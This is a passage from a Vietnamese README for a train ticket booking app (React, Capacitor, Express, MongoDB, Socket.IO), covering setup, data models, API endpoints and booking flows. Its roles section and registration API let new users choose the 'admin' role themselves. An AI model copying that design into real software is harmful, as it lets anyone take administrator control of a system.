# 🚂 Vé Tàu Bắc Nam — VetaU

> **Ứng dụng đặt vé tàu Bắc Nam** trên nền tảng di động (Android) & web, xây dựng với kiến trúc **Client–Server** hiện đại.
>
> **Frontend:** React 19 + Vite 8 + Capacitor 8 &nbsp;|&nbsp; **Backend:** Express 5 + Mongoose 9 + MongoDB &nbsp;|&nbsp; **Realtime:** Socket.IO 4

---

## 📋 Mục lục

1. [Tổng quan kiến trúc](#-tổng-quan-kiến-trúc)
2. [Tính năng chính](#-tính-năng-chính)
3. [Công nghệ sử dụng](#-công-nghệ-sử-dụng)
4. [Cấu trúc thư mục](#-cấu-trúc-thư-mục)
5. [Database Schema](#-database-schema)
6. [Yêu cầu hệ thống](#-yêu-cầu-hệ-thống)
7. [Cài đặt và chạy](#-cài-đặt-và-chạy)
8. [Chạy trên Android (Capacitor)](#-chạy-trên-android-capacitor)
9. [Biến môi trường](#-biến-môi-trường)
10. [Tài khoản và vai trò](#-tài-khoản-và-vai-trò)
11. [API Reference](#-api-reference)
12. [Luồng nghiệp vụ chính](#-luồng-nghiệp-vụ-chính)
13. [Socket.IO Events](#-socketio-events)
14. [Dữ liệu mẫu (Seed)](#-dữ-liệu-mẫu-seed)
15. [Scripts nhanh](#-scripts-nhanh)
16. [Báo cáo An ninh Thông tin](#-báo-cáo-an-ninh-thông-tin)
17. [Xử lý sự cố](#-xử-lý-sự-cố)
18. [Đóng góp & Phát triển](#-đóng-góp--phát-triển)
19. [Giấy phép](#-giấy-phép)

---

## 🏛 Tổng quan kiến trúc

```
┌──────────────────────────────────────────────────────────────────┐
│                     CLIENT (React + Capacitor)                   │
│                                                                  │
│  ┌───────────┐  ┌──────────────┐  ┌──────────────────────────┐  │
│  │  App.jsx   │  │  API Layer   │  │  Socket Client           │  │
│  │  (SPA +    │  │  (Axios +    │  │  (socket.io-client)      │  │
│  │  routing)  │  │  interceptor)│  │                          │  │
│  └───────────┘  └──────┬───────┘  └────────────┬─────────────┘  │
│                        │ HTTP/S                  │ WebSocket      │
└────────────────────────┼─────────────────────────┼───────────────┘
                         │                         │
┌────────────────────────▼─────────────────────────▼───────────────┐
│                    BACKEND (Express 5 + Node.js)                  │
│                                                                   │
│  ┌────────┐ ┌──────┐ ┌───────────┐ ┌──────┐ ┌────────────────┐  │
│  │ Helmet │ │ CORS │ │ Rate Limit│ │ Auth │ │  Error Handler │  │
│  │(header)│ │      │ │ (per-path)│ │(JWT) │ │  (prod mask)   │  │
│  └────────┘ └──────┘ └───────────┘ └──────┘ └────────────────┘  │
│                                                                   │
│  ┌──────────┐  ┌────────────┐  ┌────────────┐  ┌─────────────┐  │
│  │Controller│→ │  Service    │→ │   Model    │→ │  MongoDB    │  │
│  │ (route)  │  │(biz logic) │  │ (Mongoose) │  │             │  │
│  └──────────┘  └────────────┘  └────────────┘  └─────────────┘  │
│                                                                   │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐   │
│  │ Socket.IO    │  │ Hold Cleaner │  │  Email Service       │   │
│  │ (realtime)   │  │ (background) │  │  (Nodemailer SMTP)   │   │
│  └──────────────┘  └──────────────┘  └──────────────────────┘   │
└──────────────────────────────────────────────────────────────────┘
```

### Các thành phần chính

| Tầng | Thành phần | Mô tả |
|------|-----------|-------|
| **Client** | `App.jsx` (SPA) | Component React duy nhất xử lý routing & UI cho cả khách hàng và admin |
| **Client** | `src/api/` | Tầng API service — Axios instance với interceptor gắn JWT tự động |
| **Client** | `socketClient.js` | Kết nối Socket.IO để nhận cập nhật ghế realtime |
| **Server** | `app.js` | Express app — đăng ký middleware, mount route |
| **Server** | `server.js` | HTTP server bootstrap + Socket.IO init + Hold Cleaner |
| **Server** | `controllers/` | Xử lý request–response cho từng nghiệp vụ |
| **Server** | `services/` | Business logic tách riêng (crypto, email, pricing, payment, ticket) |
| **Server** | `models/` | 12 Mongoose schema định nghĩa cấu trúc dữ liệu |
| **Server** | `middlewares/` | Auth (JWT + role-based) và Error handler |
| **Server** | `holdCleaner.js` | Background job giải phóng ghế hết hạn hold (30s/lần) |

---

## ✨ Tính năng chính

### 👤 Khách hàng

| # | Tính năng | Mô tả |
|---|-----------|-------|
| 1 | **Đăng ký với OTP** | Đăng ký tài khoản → gửi OTP qua email → xác minh → tạo tài khoản |
| 2 | **Đăng nhập** | Đăng nhập bằng email + mật khẩu, nhận JWT token lưu trên thiết bị |
| 3 | **Tìm kiếm chuyến tàu** | Tìm theo ga đi – ga đến – ngày khởi hành |
| 4 | **Xem sơ đồ ghế realtime** | Hiển thị trạng thái ghế (trống / đang giữ / đã bán) cập nhật qua Socket.IO |
| 5 | **Giữ ghế tạm (hold)** | Chọn ghế → giữ tạm 10 phút → hết hạn tự giải phóng |
| 6 | **Nhập thông tin hành khách** | Họ tên, SĐT, CCCD — dữ liệu được mã hoá AES-256-GCM trước khi lưu |
| 7 | **Mã giảm giá (Promotion)** | Nhập mã khuyến mãi để giảm giá (phần trăm hoặc cố định) |
| 8 | **Thanh toán** | MoMo / ZaloPay / Demo mock — tích hợp qua payment gateway |
| 9 | **Vé điện tử** | Sau thanh toán, hệ thống phát hành vé điện tử với mã vé duy nhất |
| 10 | **Quản lý đơn hàng** | Xem lịch sử đơn hàng, trạng thái thanh toán |
| 11 | **Huỷ vé** | Huỷ vé đã phát hành (trước ngày khởi hành) |

### 🔧 Admin

| # | Tính năng | Mô tả |
|---|-----------|-------|
| 1 | **Quản lý chủ chuyến (Owner)** | Thêm / sửa / xem danh sách đơn vị vận tải |
| 2 | **Tạo chuyến tàu** | Tạo chuyến mới (mã tàu, loại tàu, ga đi/đến, giờ, toa, ghế) |
| 3 | **Duyệt chuyến (Publish)** | Chuyển trạng thái `draft` → `published` để khách đặt vé |
| 4 | **Huỷ chuyến** | Chuyển trạng thái → `cancelled` |
| 5 | **Xem chuyến theo Owner** | Lọc danh sách chuyến tàu theo đơn vị vận tải |

### ⚡ Hệ thống

| Tính năng | Mô tả |
|-----------|-------|
| **Realtime** | Cập nhật trạng thái ghế qua Socket.IO (hold / reserved / release) |
| **Background Hold Cleaner** | Tự động giải phóng ghế hết hạn hold mỗi 30 giây |
| **Mã hoá dữ liệu PII** | AES-256-GCM cho phone & CCCD, lưu bản mask để hiển thị |
| **Rate Limiting** | Giới hạn tổng 300 req/15 phút, riêng auth 30 req, payment 60 req |
| **Error Masking** | Ẩn chi tiết lỗi ở production, hiện đầy đủ ở development |
| **Email OTP** | Gửi OTP qua SMTP (Nodemailer) với template HTML |

---

## 🛠 Công nghệ sử dụng

### Frontend

| Thư viện | Phiên bản | Vai trò |
|----------|-----------|---------|
| React | 19.x | UI framework |
| Vite | 8.x | Build tool (ESBuild + Rolldown) |
| React Compiler | 1.x | Biên dịch tự động tối ưu React |
| Capacitor Core | 8.x | Native bridge cho Android |
| Capacitor Preferences | 8.x | Lưu trữ key-value trên thiết bị (token) |
| Capacitor App | 7.x | Quản lý app lifecycle & deep link |
| Axios | 1.x | HTTP client với interceptor |
| Lucide React | 1.x | Bộ icon SVG |
| Socket.IO Client | 4.x | Realtime WebSocket (optional) |

### Backend

| Thư viện | Phiên bản | Vai trò |
|----------|-----------|---------|
| Express | 5.x | Web framework |
| Mongoose | 9.x | MongoDB ODM |
| jsonwebtoken | 9.x | Xác thực JWT |
| bcryptjs | 3.x | Băm mật khẩu (bcrypt) |
| Helmet | 8.x | HTTP security headers |
| cors | 2.x | Cross-Origin Resource Sharing |
| express-rate-limit | 7.x | Giới hạn request |
| Nodemailer | 6.x | Gửi email OTP qua SMTP |
| Socket.IO | 4.x | Realtime server |
| Axios | 1.x | HTTP client (gọi payment gateway) |
| Moment.js | 2.x | Xử lý thời gian |
| dotenv | 17.x | Quản lý biến môi trường |

### Database & Infra

| Công nghệ | Mô tả |
|-----------|-------|
| **MongoDB** | Database chính (local hoặc MongoDB Atlas) |
| **ngrok** | Tunnel HTTP/HTTPS cho phát triển di động |

---

## 📁 Cấu trúc thư mục

```
vetau-app/
├── src/                              # Frontend React
│   ├── App.jsx                       # Component chính (routing + tất cả UI)
│   ├── App.css                       # Stylesheet chính
│   ├── index.css                     # Global CSS reset & base styles
│   ├── main.jsx                      # Entry point (React DOM render)
│   ├── socketClient.js               # Socket.IO client (init, join/leave room)
│   ├── api/                          # API service layer
│   │   ├── http.js                   # Axios instance + interceptor (JWT, ngrok)
│   │   ├── auth.api.js               # API đăng ký, đăng nhập, OTP
│   │   ├── train.api.js              # API tìm/tạo/sửa/duyệt/huỷ chuyến
│   │   ├── seat.api.js               # API giữ ghế
│   │   ├── order.api.js              # API báo giá, tạo đơn, lịch sử
│   │   ├── payment.api.js            # API tạo & xác nhận thanh toán
│   │   ├── ticket.api.js             # API vé điện tử
│   │   └── owner.api.js              # API quản lý chủ chuyến
│   ├── components/                   # React components
│   │   └── TrainSeatsRealtime.jsx    # Component sơ đồ ghế realtime
│   └── assets/                       # Tài nguyên tĩnh (images, fonts)
│
├── server/                           # Backend API
│   ├── index.js                      # Legacy server (không sử dụng ở hệ thống mới)
│   ├── .env.example                  # Mẫu biến môi trường
│   ├── package.json                  # Dependencies backend
│   └── src/
│       ├── server.js                 # HTTP + Socket.IO bootstrap
│       ├── app.js                    # Express app (middleware stack + routes)
│       ├── socket.js                 # Socket.IO init & event handlers
│       ├── holdCleaner.js            # Background job giải phóng hold hết hạn
│       │
│       ├── config/
│       │   ├── env.js                # Tập trung biến môi trường
│       │   └── db.js                 # Kết nối MongoDB
│       │
│       ├── controllers/              # Xử lý request → response
│       │   ├── auth.controller.js    # Đăng ký (OTP), đăng nhập
│       │   ├── train.controller.js   # CRUD chuyến tàu + publish/cancel
│       │   ├── seat.controller.js    # Giữ ghế tạm (hold)
│       │   ├── order.controller.js   # Báo giá, tạo đơn, xem đơn hàng
│       │   ├── payment.controller.js # Thanh toán (MoMo, ZaloPay, mock, legacy)
│       │   ├── ticket.controller.js  # Xem / huỷ vé điện tử
│       │   └── owner.controller.js   # CRUD chủ chuyến
│       │
│       ├── models/                   # Mongoose schema (12 models)
│       │   ├── user.model.js         # Người dùng (admin / customer)
│       │   ├── train.model.js        # Chuyến tàu
│       │   ├── carriage.model.js     # Toa tàu
│       │   ├── seat.model.js         # Ghế
│       │   ├── seatHold.model.js     # Giữ ghế tạm
│       │   ├── order.model.js        # Đơn hàng (encrypted passengers)
│       │   ├── payment.model.js      # Thanh toán
│       │   ├── ticket.model.js       # Vé điện tử
│       │   ├── station.model.js      # Ga tàu
│       │   ├── owner.model.js        # Chủ chuyến / đơn vị vận tải
│       │   ├── promotion.model.js    # Mã giảm giá
│       │   └── pendingRegistration.model.js  # Đăng ký chờ OTP
│       │
│       ├── services/                 # Business logic
│       │   ├── crypto.service.js     # Mã hoá AES-256-GCM (phone, CCCD)
│       │   ├── email.service.js      # Gửi OTP email (Nodemailer)
│       │   ├── pricing.service.js    # Tính giá vé + áp dụng khuyến mãi
│       │   ├── payment.service.js    # Shared payment logic
│       │   ├── momo.service.js       # Tích hợp MoMo payment gateway
│       │   ├── zalopay.service.js    # Tích hợp ZaloPay payment gateway
│       │   └── ticket.service.js     # Phát hành vé điện tử
│       │
│       ├── routes/                   # Express route definitions
│       │   ├── auth.routes.js        # /api/auth/*
│       │   ├── train.routes.js       # /api/trains/*
│       │   ├── seat.routes.js        # /api/seats/*
│       │   ├── order.routes.js       # /api/orders/*
│       │   ├── payment.routes.js     # /api/payments/*
│       │   ├── ticket.routes.js      # /api/tickets/*
│       │   └── owner.routes.js       # /api/owners/*
│       │
│       ├── middlewares/
│       │   ├── auth.middleware.js     # JWT verify + requireRole()
│       │   ├── error.middleware.js    # Global error handler (prod masking)
│       │   ├── inputSanitizer.middleware.js  # 🆕 Chống NoSQL Injection + XSS
│       │   ├── inputValidator.middleware.js  # 🆕 Validate input (email, password, PII)
│       │   └── audit.middleware.js    # 🆕 Security audit logging
│       │
│       ├── seeds/
│       │   └── seed.js               # Tạo dữ liệu mẫu (ga, tàu, toa, ghế, promotion)
│       │
│       └── utils/
│           ├── generateCode.js       # Tạo mã đơn hàng / vé (CSPRNG)
│           └── mask.js               # Mask PII (phone, CCCD, name, email)
│
├── android/                          # Dự án Android (Capacitor generated)
├── scripts/
│   └── generate-payment-report.mjs   # Script tạo báo cáo thanh toán (.docx)
│
├── capacitor.config.json             # Cấu hình Capacitor (appId, server)
├── vite.config.js                    # Cấu hình Vite + React Compiler
├── eslint.config.js                  # ESLint config
├── index.html                        # HTML entry (Vite SPA)
├── package.json                      # Dependencies frontend
├── .env.example                      # Mẫu biến MoMo + client return
├── .gitignore                        # Git ignore rules
└── README.md                         # Tài liệu này
```

---

## 🗄 Database Schema

### Sơ đồ quan hệ

```
┌──────────┐     ┌──────────┐     ┌───────────┐     ┌──────────┐
│  Station │     │  Owner   │────→│   Train   │←────│ Carriage │
│          │     │          │ 1:N │           │ 1:N │          │
└──────────┘     └──────────┘     └─────┬─────┘     └────┬─────┘
                                        │                 │
                                        │ 1:N             │ 1:N
                                   ┌────▼────┐       ┌────▼────┐
                                   │  Seat   │       │  Seat   │
                                   └────┬────┘       └─────────┘
                                        │
                                   ┌────▼──────┐
                                   │ SeatHold  │ (TTL: 10 phút)
                                   └───────────┘
                                        │
┌──────────┐     ┌──────────┐     ┌────▼────┐     ┌──────────┐
│   User   │────→│  Order   │←────│ Payment │     │ Ticket   │
│          │ 1:N │(encrypted│     │(MoMo/   │     │(per seat)│
│          │     │passengers)│────→│ZaloPay/ │     │          │
└──────────┘     └─────┬────┘     │ mock)   │     └──────────┘
                       │          └─────────┘           ▲
                       └────────────────────────────────┘
                                    1:N
```

### Danh sách Models (12 collections)

| Model | Collection | Mô tả | Trường chính |
|-------|-----------|-------|-------------|
| **User** | `users` | Tài khoản người dùng | `name`, `email`, `password` (bcrypt), `role` (admin/customer), `isEmailVerified`, `failedLoginAttempts`, `lockUntil` |
| **Station** | `stations` | Ga tàu | `code` (HN, DAD, HCM...), `name`, `city` |
| **Owner** | `owners` | Đơn vị vận tải | `name`, `contactName`, `phone`, `email`, `type` (company/individual) |
| **Train** | `trains` | Chuyến tàu | `trainCode`, `trainType`, `status` (draft/published/cancelled), `ownerId`, `fromStationCode`, `toStationCode`, giờ đi/đến |
| **Carriage** | `carriages` | Toa tàu | `trainId`, `carriageCode`, `carriageType`, `seatCount`, `basePrice` |
| **Seat** | `seats` | Ghế | `trainId`, `carriageId`, `seatNumber`, `classType` (seat/berth6/berth4), `basePrice`, `status` (available/held/sold) |
| **SeatHold** | `seatholds` | Giữ ghế tạm | `userId`, `trainId`, `seatIds[]`, `expiresAt`, `status` (active/expired/converted) |
| **Order** | `orders` | Đơn hàng | `orderCode`, `userId`, `trainId`, `selectedSeats[]`, `passengers[]` (ALL fields encrypted), `pricing`, `paymentStatus`, `orderStatus` |
| **Payment** | `payments` | Thanh toán | `orderId`, `method` (momo/zalopay/mock), `amount`, `transactionId`, `status` |
| **Ticket** | `tickets` | Vé điện tử | `ticketCode`, `orderId`, `trainSnapshot`, `seatSnapshot`, `passengerSnapshot` (masked), `ticketStatus` |
| **Promotion** | `promotions` | Mã giảm giá | `code`, `type` (percent/fixed), `value`, `minOrderValue`, `maxDiscount`, `startAt`, `endAt`, `isActive` |
| **PendingRegistration** | `pendingregistrations` | Đăng ký chờ xác minh OTP | `email`, `name`, `password` (bcrypt), `otp`, TTL auto-expire |
| **AuditLog** 🆕 | `auditlogs` | Nhật ký bảo mật | `userId`, `action`, `resource`, `resourceId`, `ip`, `userAgent`, `details`, `timestamp` (TTL 90 ngày) |

---

## 💻 Yêu cầu hệ thống

| Yêu cầu | Phiên bản |
|----------|-----------|
| **Node.js** | 18+ (khuyến nghị 20+) |
| **MongoDB** | 6+ (local hoặc MongoDB Atlas) |
| **npm** | 9+ |
| **Android Studio** | Mới nhất (nếu build Android) |
| **JDK** | 17+ (cho Gradle / Android) |

---

## 🚀 Cài đặt và chạy

### 1. Clone dự án

```bash
git clone <repo-url>
cd vetau-app
```

### 2. Cài đặt Frontend

```bash
npm install
```

### 3. Cài đặt Backend

```bash
cd server
npm install
```

### 4. Cấu hình biến môi trường

Tạo file `server/.env` từ mẫu:

```bash
cp server/.env.example server/.env
```

Chỉnh sửa các giá trị trong `server/.env` (xem mục [Biến môi trường](#-biến-môi-trường)).

> ⚠️ **Quan trọng:** `DATA_ENCRYPTION_KEY` bắt buộc đúng **64 ký tự hex** (32 bytes). Nếu sai định dạng, server sẽ **throw error và dừng ngay** khi khởi động.

Tạo key nhanh:

```bash
# Linux / macOS
openssl rand -hex 32

# Windows (PowerShell)
-join ((1..32) | ForEach-Object { '{0:x2}' -f (Get-Random -Maximum 256) })
```

### 5. Cấu hình SMTP (tuỳ chọn — cho OTP email)

Thêm vào `server/.env`:

```env
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_USER=your-email@gmail.com
SMTP_PASS=your-app-password
SMTP_SECURE=false
EMAIL_FROM=no-reply@vetau.app
```

> Nếu không cấu hình SMTP, đăng ký vẫn hoạt động nhưng OTP sẽ **không gửi email** (chỉ log ra console ở development).

### 6. Seed dữ liệu mẫu (tuỳ chọn)

```bash
cd server
npm run seed
```

Seed tạo sẵn: **9 ga tàu**, **4 chuyến tàu** (SE1, SE3, SE5, SE7), **3 loại toa** (ngồi mềm, nằm khoang 6, nằm khoang 4), **2 chủ chuyến**, và **1 mã giảm giá** (`SAVE20`).

### 7. Chạy ứng dụng

Mở **2 terminal**:

```bash
# Terminal 1 — Backend
cd server
npm run dev
# → http://localhost:5000

# Terminal 2 — Frontend
npm run dev
# → http://localhost:5173
```

### 8. Kiểm tra server

```bash
curl http://localhost:5000/api/health
# → { "success": true, "message": "Server OK" }
```

---

## 📱 Chạy trên Android (Capacitor)

### Build & Deploy

```bash
# 1. Build frontend thành static files
npm run build

# 2. Sync vào Android project
npx cap sync android

# 3. Mở Android Studio
npx cap open android
```

Trong Android Studio, bấm **Run** (▶️) để cài APK lên emulator hoặc thiết bị thật.

### Cấu hình Capacitor

File `capacitor.config.json`:

```json
{
  "appId": "com.vetau.app",
  "appName": "vetau-app",
  "webDir": "dist",
  "server": {
    "androidScheme": "https",
    "cleartext": true,
    "allowNavigation": ["10.0.2.2", "localhost"]
  }
}
```

### API Base URL theo môi trường

| Môi trường | API URL | Ghi chú |
|------------|---------|---------|
| **Web (localhost)** | `http://localhost:5000/api` | Mặc định |
| **Emulator Android** | `http://10.0.2.2:5000/api` | Emulator map `10.0.2.2` → host machine |
| **Thiết bị thật (LAN)** | `http://<IP-máy-tính>:5000/api` | Cùng mạng WiFi |
| **Thiết bị thật (ngrok)** | `https://<subdomain>.ngrok-free.dev/api` | Tunnel qua internet |

> Cập nhật `API_BASE_URL` trong `src/api/http.js` khi đổi môi trường.

### Deep Link

App sử dụng custom URL scheme `vetau://` để nhận callback từ payment gateway:
- **MoMo / ZaloPay** → redirect về `vetau://payment-result` → app xử lý kết quả

### Lưu ý

- Nếu giao diện chưa cập nhật trên Android, xoá app trên thiết bị và cài lại
- Sau khi thay đổi code frontend, nhớ: `npm run build` → `npx cap sync android`
- Token xác thực được lưu bằng `@capacitor/preferences` (persist qua lần mở app)

---

## 🔧 Biến môi trường

### Backend (`server/.env`)

| Biến | Bắt buộc | Mặc định | Mô tả |
|------|:--------:|----------|-------|
| `PORT` | ❌ | `5000` | Port backend server |
| `NODE_ENV` | ❌ | `development` | Môi trường (`development` / `production`) |
| `MONGO_URI` | ✅ | — | Connection string MongoDB |
| `JWT_SECRET` | ✅ | — | Secret key cho JWT (nên ≥ 32 ký tự random) |
| `DATA_ENCRYPTION_KEY` | ✅ | — | 64 ký tự hex — khoá AES-256-GCM cho dữ liệu PII |
| `APP_ORIGIN` | ❌ | `http://localhost:5173,...` | Allowed origins cho CORS (phân cách bằng `,`) |
| `API_BASE_URL` | ❌ | `http://localhost:5000` | Base URL server (dùng trong email link, callback) |

**OTP & Email:**

| Biến | Bắt buộc | Mặc định | Mô tả |
|------|:--------:|----------|-------|
| `EMAIL_VERIFY_SECRET` | ❌ | — | Secret riêng cho token xác minh email |
| `EMAIL_VERIFY_TTL` | ❌ | `30m` | Thời hạn token xác minh email |
| `OTP_EXPIRES_MINUTES` | ❌ | `5` | OTP hết hạn sau N phút |
| `OTP_RESEND_COOLDOWN_SECONDS` | ❌ | `60` | Thời gian chờ giữa 2 lần gửi OTP |
| `OTP_MAX_ATTEMPTS` | ❌ | `5` | Số lần thử OTP sai tối đa |
| `OTP_RESEND_MAX_PER_HOUR` | ❌ | `5` | Số lần gửi lại OTP tối đa / giờ |
| `SMTP_HOST` | ❌ | — | SMTP server (vd: `smtp.gmail.com`) |
| `SMTP_PORT` | ❌ | `587` | SMTP port |
| `SMTP_USER` | ❌ | — | SMTP username |
| `SMTP_PASS` | ❌ | — | SMTP password / app password |
| `SMTP_SECURE` | ❌ | `false` | Dùng SSL (`true` cho port 465) |
| `EMAIL_FROM` | ❌ | `no-reply@vetau.local` | Địa chỉ gửi email |

**Payment Gateway:**

| Biến | Bắt buộc | Mặc định | Mô tả |
|------|:--------:|----------|-------|
| `MOMO_PARTNER_CODE` | ❌ | — | Partner code MoMo |
| `MOMO_ACCESS_KEY` | ❌ | — | Access key MoMo |
| `MOMO_SECRET_KEY` | ❌ | — | Secret key MoMo |
| `MOMO_ENDPOINT` | ❌ | `https://test-payment.momo.vn/...` | MoMo API endpoint |
| `MOMO_RETURN_URL` | ❌ | — | URL MoMo redirect sau thanh toán |
| `MOMO_NOTIFY_URL` | ❌ | — | URL MoMo gọi webhook (IPN) |
| `CLIENT_RETURN_URL` | ❌ | `vetau://payment-result` | Deep link trả về app |
| `PAYMENT_DEMO` | ❌ | — | `true` = chế độ demo (không gọi gateway thật) |

### Frontend (`src/api/http.js`)

| Biến / Hằng số | Mô tả |
|----------------|-------|
| `API_BASE_URL` | URL API server (hardcode hoặc dùng `import.meta.env.VITE_API_URL`) |
| `VITE_API_WS` | (env) URL WebSocket server cho Socket.IO |

---

## 👤 Tài khoản và vai trò

### Hệ thống phân quyền

| Vai trò | Mô tả | Quyền hạn |
|---------|-------|-----------|
| **customer** | Khách mua vé (mặc định) | Tìm chuyến, đặt vé, thanh toán, xem đơn hàng, xem/huỷ vé |
| **admin** | Quản trị viên | Tất cả quyền customer + quản lý owner, tạo/duyệt/huỷ chuyến |

### Cách hoạt động

1. **Đăng ký:** Người dùng chọn vai trò (`admin` hoặc `customer`) khi đăng ký
2. **Lưu trữ:** Role lưu trong field `role` của collection `users`
3. **Bảo vệ:** Route admin sử dụng middleware chain: `auth` → `requireRole('admin')`
4. **Không thể đổi role qua UI** — chỉ có thể thay đổi trực tiếp trong database

### Luồng xác thực

```
Đăng ký → Gửi OTP email → Xác minh OTP → Tạo tài khoản → Nhận JWT
                                                              │
Đăng nhập → Kiểm tra email + password (bcrypt) → Nhận JWT ────┘
                                                              │
                                               Mọi request API│
                                               đính kèm JWT   │
                                               trong header    ▼
                                         Authorization: Bearer <token>
```

---

## 🔌 API Reference

**Base URL:** `http://localhost:5000/api`

### Health Check

| Method | Endpoint | Auth | Mô tả |
|--------|----------|:----:|-------|
| `GET` | `/api/health` | ❌ | Kiểm tra server hoạt động |

**Response:**
```json
{ "success": true, "message": "Server OK" }
```

---

### Auth (`/api/auth`) — Rate Limit: 30 req / 15 phút

| Method | Endpoint | Auth | Mô tả |
|--------|----------|:----:|-------|
| `POST` | `/auth/register/send-otp` | ❌ | Gửi OTP email để đăng ký |
| `POST` | `/auth/register/verify-otp` | ❌ | Xác minh OTP, tạo tài khoản |
| `POST` | `/auth/register/resend-otp` | ❌ | Gửi lại OTP |
| `POST` | `/auth/login` | ❌ | Đăng nhập |

<details>
<summary><b>POST /auth/register/send-otp</b></summary>

**Request:**
```json
{
  "name": "Nguyễn Văn A",
  "email": "user@example.com",
  "password": "mypassword123",
  "role": "customer"
}
```

**Response (200):**
```json
{
  "success": true,
  "message": "OTP da duoc gui den email"
}
```
</details>

<details>
<summary><b>POST /auth/register/verify-otp</b></summary>

**Request:**
```json
{
  "email": "user@example.com",
  "otp": "123456"
}
```

**Response (201):**
```json
{
  "success": true,
  "token": "eyJhbGc...",
  "user": {
    "id": "665...",
    "name": "Nguyễn Văn A",
    "email": "user@example.com",
    "role": "customer"
  }
}
```
</details>

<details>
<summary><b>POST /auth/login</b></summary>

**Request:**
```json
{
  "email": "user@example.com",
  "password": "mypassword123"
}
```

**Response (200):**
```json
{
  "success": true,
  "token": "eyJhbGc...",
  "user": {
    "id": "665...",
    "name": "Nguyễn Văn A",
    "email": "user@example.com",
    "role": "customer"
  }
}
```
</details>

---

### Trains (`/api/trains`)

| Method | Endpoint | Auth | Role | Mô tả |
|--------|----------|:----:|:----:|-------|
| `GET` | `/trains/search?from=HN&to=DAD&date=2026-06-15` | ❌ | — | Tìm chuyến tàu |
| `GET` | `/trains/:trainId/seats` | ❌ | — | Lấy sơ đồ ghế |
| `GET` | `/trains/owner/:ownerId` | ✅ | admin | Danh sách chuyến theo owner |
| `POST` | `/trains` | ✅ | admin | Tạo chuyến mới |
| `PUT` | `/trains/:id` | ✅ | admin | Cập nhật chuyến |
| `PATCH` | `/trains/:id/publish` | ✅ | admin | Duyệt → published |
| `PATCH` | `/trains/:id/cancel` | ✅ | admin | Huỷ → cancelled |

---

### Seats (`/api/seats`)

| Method | Endpoint | Auth | Mô tả |
|--------|----------|:----:|-------|
| `POST` | `/seats/hold` | ✅ | Giữ ghế tạm (10 phút) |

<details>
<summary><b>POST /seats/hold</b></summary>

**Request:**
```json
{
  "trainId": "665abc...",
  "seatIds": ["665def...", "665ghi..."]
}
```

**Response (200):**
```json
{
  "success": true,
  "holdId": "665jkl...",
  "expiresAt": "2026-06-15T10:10:00.000Z",
  "seatIds": ["665def...", "665ghi..."]
}
```
</details>

---

### Orders (`/api/orders`)

| Method | Endpoint | Auth | Mô tả |
|--------|----------|:----:|-------|
| `POST` | `/orders/quote` | ✅ | Báo giá (tính subtotal, discount, total) |
| `POST` | `/orders` | ✅ | Tạo đơn hàng |
| `GET` | `/orders/my` | ✅ | Xem đơn hàng của tôi (sanitized, không trả encrypted data) |

---

### Payments (`/api/payments`) — Rate Limit: 60 req / 15 phút

| Method | Endpoint | Auth | Mô tả |
|--------|----------|:----:|-------|
| `POST` | `/payments/create` | ✅ | Tạo thanh toán (auto chọn provider) |
| `POST` | `/payments/mock-confirm` | ✅ | Xác nhận mock payment (demo mode) |
| `POST` | `/payments/complete-legacy` | ✅ | Luồng thanh toán legacy (chặn ở production) |
| `GET` | `/payments/momo-return` | ❌ | MoMo redirect callback |
| `POST` | `/payments/momo-notify` | ❌ | MoMo IPN webhook |
| `GET` | `/payments/mock-checkout` | ❌ | Trang mock checkout (demo) |
| `GET` | `/payments/mock-complete` | ❌ | Hoàn tất mock payment |

---

### Tickets (`/api/tickets`)

| Method | Endpoint | Auth | Mô tả |
|--------|----------|:----:|-------|
| `GET` | `/tickets/my` | ✅ | Danh sách vé của tôi |
| `GET` | `/tickets/:ticketCode` | ✅ | Chi tiết vé điện tử |
| `POST` | `/tickets/:ticketCode/cancel` | ✅ | Huỷ vé |

---

### Owners (`/api/owners`) — Chỉ Admin

| Method | Endpoint | Auth | Role | Mô tả |
|--------|----------|:----:|:----:|-------|
| `GET` | `/owners` | ✅ | admin | Danh sách chủ chuyến |
| `POST` | `/owners` | ✅ | admin | Thêm chủ chuyến mới |
| `GET` | `/owners/:id` | ✅ | admin | Chi tiết chủ chuyến |
| `PUT` | `/owners/:id` | ✅ | admin | Cập nhật chủ chuyến |

---

### Rate Limit tổng hợp

| Scope | Giới hạn | Áp dụng cho |
|-------|---------|------------|
| **Global** | 300 req / 15 phút | Toàn bộ API |
| **Auth** | 30 req / 15 phút | `/api/auth/*` |
| **Payment** | 60 req / 15 phút | `/api/payments/*` |

---

## 🔄 Luồng nghiệp vụ chính

### Luồng đặt vé (Customer)

```
1. Tìm chuyến     GET  /trains/search?from=HN&to=DAD&date=...
       │
2. Xem ghế        GET  /trains/:trainId/seats
       │
3. Giữ ghế        POST /seats/hold         ← Socket emit "seat:hold"
       │                                       (ghế hiển thị "đang giữ" cho tất cả)
       │
4. Báo giá        POST /orders/quote       ← Tính subtotal + promotion
       │
5. Tạo đơn        POST /orders             ← Lưu encrypted passengers
       │
6. Thanh toán      POST /payments/create    ← Trả payUrl (MoMo/ZaloPay/mock)
       │
7. Redirect        User thanh toán trên gateway → callback/webhook
       │
8. Phát hành vé   ← Tự động khi payment confirmed
       │                Socket emit "seat:reserved"
       │
9. Xem vé         GET  /tickets/my
```

### Luồng quản lý chuyến tàu (Admin)

```
1. Tạo Owner      POST /owners
       │
2. Tạo chuyến     POST /trains              ← status: "draft"
       │
3. Duyệt          PATCH /trains/:id/publish ← status: "published"
       │                                       (khách mới thấy khi tìm kiếm)
       │
4. (Nếu cần) Huỷ  PATCH /trains/:id/cancel  ← status: "cancelled"
```

### Luồng Hold Cleaner (Background)

```
Mỗi 30 giây:
  1. Tìm SeatHold có status "active" và expiresAt ≤ now
  2. Cập nhật status → "expired"
  3. Emit Socket event "seat:release" → client cập nhật UI
```

---

## 📡 Socket.IO Events

### Server → Client

| Event | Payload | Mô tả |
|-------|---------|-------|
| `seat:hold` | `{ seatIds, holdId, userId }` | Ghế vừa bị giữ tạm |
| `seat:reserved` | `{ seatIds, orderId }` | Ghế đã được mua (confirmed) |
| `seat:release` | `{ seatIds, holdId }` | Ghế được giải phóng (hold hết hạn) |

### Client → Server

| Event | Payload | Mô tả |
|-------|---------|-------|
| `joinTrain` | `trainId` (string) | Tham gia room của chuyến tàu để nhận cập nhật |
| `leaveTrain` | `trainId` (string) | Rời room |

### Room pattern

